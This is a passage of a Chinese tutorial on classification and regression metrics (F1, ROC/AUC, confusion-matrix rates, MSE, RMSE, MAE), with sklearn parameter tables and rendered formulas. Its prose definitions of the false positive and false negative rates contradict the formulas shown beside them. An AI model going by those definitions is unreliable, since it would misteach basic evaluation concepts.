<td align="left">
<strong>list, optional</strong> 当average!='binary’时要包括的一组标签，如果average是None，则是标签的顺序。可以排除数据中存在的标签，例如，以忽略多数否定类的方式计算多类平均值，而数据中不存在的标签将导致宏平均值中的0成分。对于多标签目标，标签是列索引。 默认情况下，y_true和y_pred中的所有标签均按排序顺序使用。 在版本0.17中进行了更改：针对多类问题改进了参数标签。</td>
</tr>
<tr>
<td align="left"><strong>pos_label</strong></td>
<td align="left">
<strong>str or int, 1 by default</strong> average ='binary’且数据为二进制的要进行报告的类。如果数据是多类或多标签的，则将被忽略；设置labels=[pos_label]及average!='binary’将仅报告该标签的得分。</td>
</tr>
<tr>
<td align="left"><strong>average</strong></td>
<td align="left">
<strong>string,[None| ‘binary’(default)| ‘micro’| ‘macro’| ‘samples’| ‘weighted’]</strong> 对于多类/多标签目标，此参数是必需的。如果为None，则返回每个类的得分。否则，将确定数据执行的平均类型： - <strong><code>'binary'</code>:</strong> 仅报告由pos_label指定的类的结果。仅当目标（y_ {true，pred}）为二进制时才适用。 - <strong><code>'micro'</code>:</strong> 通过计算真正例、假负例和假正例的总数来全局计算度量。 - <strong><code>'macro'</code>:</strong> 计算每个标签的度量，并找到其未加权平均值。 这没有考虑标签不平衡。 - <strong><code>'weighted'</code>:</strong> 计算每个标签的度量，并找到它们受支持的平均权重（每个标签的真实实例数）。这会更改‘macro’以解决标签不平衡的问题；这可能导致F-score不在精确度和召回率之间。 - <strong><code>'samples'</code>:</strong> 计算每个实例的度量，并找到它们的平均值（仅对不同于<a href="https://scikit-learn.org.cn/view/476.html"><code>accuracy_score</code></a>的多标签分类有意义）。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。</td>
</tr>
<tr>
<td align="left"><strong>zero_division</strong></td>
<td align="left">
<strong>“warn”, 0 or 1, default=”warn”</strong> 设置除数为零（即所有预测和标签均为负）时的返回值。如果设置为“warn”，则该值为0，但也会发出警告。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>f1_score</strong></td>
<td align="left">
<strong>float or array of float, shape = [n_unique_labels]</strong> 二进制分类中的正例类的F1分数，或者对于多类别任务，每个类别的F1分数的加权平均值。</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>G值</strong>：是精确率与召回率的另一种评价指标，它是精确率和召回率的几何平均数。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           G
          
          
           =
          
          
           
            
             P
            
            
             r
            
            
             e
            
            
             c
            
            
             i
            
            
             s
            
            
             i
            
            
             o
            
            
             n
            
            
             ⋅
            
            
             R
            
            
             e
            
            
             c
            
            
             a
            
            
             l
            
            
             l
            
           
          
         
         
           G=sqrt{Precision cdot Recall} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.04em;vertical-align: -0.058905em"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.981095em"><span class="svg-align"><span class="pstrut" style="height: 3em"></span><span class="mord" style="padding-left: 0.833em"><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="hide-tail" style="min-width: 0.853em;height: 1.08em">
              
               
              </span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.058905em"><span class=""></span></span></span></span></span></span></span></span></span></span></p> </li>
<li> <p><strong>ROC曲线和AUC</strong> ：当测试集中的正负样本的分布变化的时候，ROC曲线能够保持不变，即ROC曲线能够很好的消除样本类别不平衡对评估指标产生的影响（把实际中的正样例与负样例分开考虑）。ROC曲线与下方坐标轴围成的面积就是AUC，考虑的是样本预测的排序质量，因此与排序误差有紧密联系，AUC的值应当越大越好。<br> <img src="https://images2.imgbox.com/d3/87/IXRYsBE2_o.png" alt="在这里插入图片描述" width="300"></p> <p><strong>对应sklearn包</strong> （AUC）：</p> <p><code>sklearn.metrics.auc(x, y)</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>x</strong></td>
<td align="left">
<strong>array, shape = [n]</strong> x坐标。这些必须是单调递增或单调递减。</td>
</tr>
<tr>
<td align="left"><strong>y</strong></td>
<td align="left">
<strong>array, shape = [n]</strong> y坐标。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>auc</strong></td>
<td align="left"><strong>float</strong></td>
</tr></tbody>
</table>
<p><strong>对应sklearn包</strong>(ROC) ：</p> <p><code>sklearn.metrics.roc_curve(y_true, y_score, *, pos_label=None, sample_weight=None, drop_intermediate=True)</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>array, shape = [n_samples]</strong> 真正的二进制标签。 如果标签既不是{-1，1}也不是{0，1}，则应该明确给出pos_label。</td>
</tr>
<tr>
<td align="left"><strong>y_score</strong></td>
<td align="left">
<strong>array, shape = [n_samples]</strong> 目标分数可以是正例类的概率估计值，置信度值或决策的非阈值度量（如某些分类器上的“ decision_function”所返回）。</td>
</tr>
<tr>
<td align="left"><strong>pos_label</strong></td>
<td align="left">
<strong>int or str, default=None</strong> 正例类的标签。当pos_label = None时，如果y_true在{-1，1}或{0，1}中，则pos_label设置为1，否则将引发错误。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。</td>
</tr>
<tr>
<td align="left"><strong>drop_intermediate</strong></td>
<td align="left">
<strong>boolean, optional (default=True)</strong> 是否降低一些未达到最佳阈值的阈值，这些阈值不会出现在绘制的ROC曲线上。 这对于创建较浅的ROC曲线很有用。 版本0.17中的新功能：参数drop_intermediate。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>fpr</strong></td>
<td align="left">
<strong>array, shape = [&gt;2]</strong> 增加假正例率，使得元素i是score &gt;= thresholds[i]预测的假正例率。</td>
</tr>
<tr>
<td align="left"><strong>tpr</strong></td>
<td align="left">
<strong>array, shape = [&gt;2]</strong> 增加真正例率，使得元素i是score &gt;= thresholds[i]的预测的真正例率。</td>
</tr>
<tr>
<td align="left"><strong>thresholds</strong></td>
<td align="left">
<strong>array, shape = [n_thresholds]</strong> 用于计算fpr和tpr的决策函数的阈值递减。 thresholds [0]表示没有实例在预测中，可以任意设置为max（y_score）+ 1。</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>真正率</strong>、<strong>假正率</strong>、<strong>真负率</strong>、<strong>假负率</strong>：</p> <p>真正率：在所有<strong>实际</strong>为<strong>正例</strong>的样本中，<strong>正确</strong>判断为<strong>正例</strong>的概率；</p> <p>假正率：在所有<strong>实际</strong>为<strong>负例</strong>的样本中，<strong>错误</strong>判断为<strong>负例</strong>的概率；</p> <p>真负率：在所有<strong>实际</strong>为<strong>负例</strong>的样本中，<strong>正确</strong>判断为<strong>负例</strong>的概率；</p> <p>假负率：在所有<strong>实际</strong>为<strong>正例</strong>的样本中，<strong>错误</strong>判断为<strong>正例</strong>的概率。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           T
          
          
           P
          
          
           R
          
          
           =
          
          
           
            
             T
            
            
             P
            
           
           
            
             T
            
            
             P
            
            
             +
            
            
             F
            
            
             N
            
           
          
          
          
           F
          
          
           P
          
          
           R
          
          
           =
          
          
           
            
             F
            
            
             P
            
           
           
            
             F
            
            
             P
            
            
             +
            
            
             T
            
            
             N
            
           
          
          
          
           T
          
          
           N
          
          
           R
          
          
           =
          
          
           
            
             T
            
            
             N
            
           
           
            
             T
            
            
             N
            
            
             +
            
            
             F
            
            
             P
            
           
          
          
          
           F
          
          
           N
          
          
           R
          
          
           =
          
          
           
            
             F
            
            
             N
            
           
           
            
             F
            
            
             N
            
            
             +
            
            
             T
            
            
             P
            
           
          
          
         
         
           TPR=frac{TP}{TP+FN} quad FPR=frac{FP}{FP+TN} quad TNR=frac{TN}{TN+FP} quad FNR=frac{FN}{FN+TP} quad 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 1em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 1em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 1em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 1em"></span></span></span></span></span></span><br> <strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.confusion_matrix(y_true, y_pred, *, labels=None, sample_weight=None, normalize=None)</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,)</strong> 真实目标值。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,)</strong> 分类器返回的估计目标。</td>
</tr>
<tr>
<td align="left"><strong>labels</strong></td>
<td align="left">
<strong>array-like of shape (n_classes), default=None</strong> 索引矩阵的标签列表。可用于重新排序或选择标签的子集。如果指定None，则那些在y_true或y_pred中至少出现一次的标签将按照排序使用。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。 版本0.18中的新功能。</td>
</tr>
<tr>
<td align="left"><strong>normalize</strong></td>
<td align="left">
<strong>{‘true’, ‘pred’, ‘all’}, default=None</strong> 对真实（行），预测（列）条件或所有总体的混淆矩阵进行归一化。 如果为None，则不会对混淆矩阵进行归一化。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>C</strong></td>
<td align="left">
<strong>ndarray of shape (n_classes, n_classes)</strong> 混淆矩阵，其第i行和第j列条目指示真实标签为第i类且预测标签为第j类的样本数。</td>
</tr></tbody>
</table>
</li>
</ol> 
<h3>
<a id="33__655"></a>3.3. 回归任务</h3> 
<ol><li>
<strong>均方误差(MSE)或L2范数损失</strong>：通过计算真实值与预测值的差值的平方和的均值来衡量距离。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
      
       
        
         
          M
         
         
          S
         
         
          E
         
         
          =
         
         
          
           1
          
          
           m
          
         
         
          
           ∑
          
          
           
            i
           
           
            =
           
           
            1
           
          
          
           m
          
         
         
          
           (
          
          
           f
          
          
           (
          
          
           
            x
           
           
            i
           
          
          
           )
          
          
           −
          
          
           
            y
           
           
            i
           
          
          
           
            )
           
           
            2
           
          
         
        
        
          MSE=frac{1}{m} sum_{i=1}^{m}{(f(x_i)-y_i)^2} 
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">M</span><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.92907em;vertical-align: -1.27767em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.32144em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.6514em"><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class=""><span class="pstrut" style="height: 3.05em"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.27767em"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mopen">(</span><span class="mord mathdefault" style="margin-right: 0.10764em">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.864108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</li></ol> 
<p><strong>对应sklearn包</strong> ：</p> 
<p><code>sklearn.metrics.mean_squared_error(y_true, y_pred, *, sample_weight=None, multioutput='uniform_average', squared=True)</code></p> 
<p><strong>参数</strong>：</p> 
<table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,) or (n_samples, n_outputs)</strong> 真实目标值。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,) or (n_samples, n_outputs)</strong> 预测目标值。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), optional</strong> 样本权重。</td>
</tr>
<tr>
<td align="left"><strong>multioutput</strong></td>
<td align="left">
<strong>string in [‘raw_values’, ‘uniform_average’] or array-like of shape (n_outputs)</strong> 定义多个输出值的汇总。类似数组的值定义了用于平均误差的权重。 - <strong>‘raw_values’：</strong> 如果是多输出格式的输入，则返回完整的错误集。 - <strong>‘uniform_average’：</strong> 所有输出的误差均以相同的权重平均。</td>
</tr>
<tr>
<td align="left"><strong>squared</strong></td>
<td align="left">
<strong>boolean value, optional (default = True)</strong> 如果为True，则返回MSE值；如果为False，则返回RMSE值。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
<table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>loss</strong></td>
<td align="left">
<strong>float or ndarray of floats</strong> 非负浮点值（最佳值为0.0）或浮点值数组，每个目标对应一个浮点值。</td>
</tr></tbody>
</table>
<ol start="2">
<li> <p><strong>均方根误差(RMSE)</strong>： 通过计算真实值与预测值的差值的平方和的均值的标准差来衡量距离。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           R
          
          
           M
          
          
           S
          
          
           E
          
          
           =
          
          
           
            
             
              1
             
             
              m
             
            
            
             
              ∑
             
             
              
               i
              
              
               =
              
              
               1
              
             
             
              m
             
            
            
             
              (
             
             
              f
             
             
              (
             
             
              
               x
              
              
               i
              
             
             
              )
             
             
              −
             
             
              
               y
              
              
               i
              
             
             
              
               )
              
              
               2
              
             
            
           
          
         
         
           RMSE=sqrt{ frac{1}{m} sum_{i=1}^{m}{(f(x_i)-y_i)^2}} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault" style="margin-right: 0.10903em">M</span><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 3.15682em;vertical-align: -1.27767em"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.87915em"><span class="svg-align"><span class="pstrut" style="height: 5.11682em"></span><span class="mord" style="padding-left: 1.056em"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.32144em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.6514em"><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class=""><span class="pstrut" style="height: 3.05em"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.27767em"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mopen">(</span><span class="mord mathdefault" style="margin-right: 0.10764em">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.740108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 5.11682em"></span><span class="hide-tail" style="min-width: 0.742em;height: 3.19682em">
              
               
              </span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.27767em"><span class=""></span></span></span></span></span></span></span></span></span></span></p> </li>
<li> <p><strong>平均绝对误差(MAE)或L1范数损失</strong>： 通过计算预测值和真实值之间的距离的绝对值的均值来衡量距离。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           M
          
          
           A
          
          
           E
          
          
           =
          
          
           
            1
           
           
            m
           
          
          
           
            ∑
           
           
            
             i
            
            
             =
            
            
             1
            
           
           
            m
           
          
          
           ∣
          
          
           
            
             y
            
            
             i
            
           
           
            −
           
           
            f
           
           
            (
           
           
            
             x
            
            
             i
            
           
           
            )
           
           
            ∣
           
          
         
         
           MAE=frac{1}{m} sum_{i=1}^{m}|{y_i-f(x_i)|} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.92907em;vertical-align: -1.27767em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.32144em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.6514em"><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord 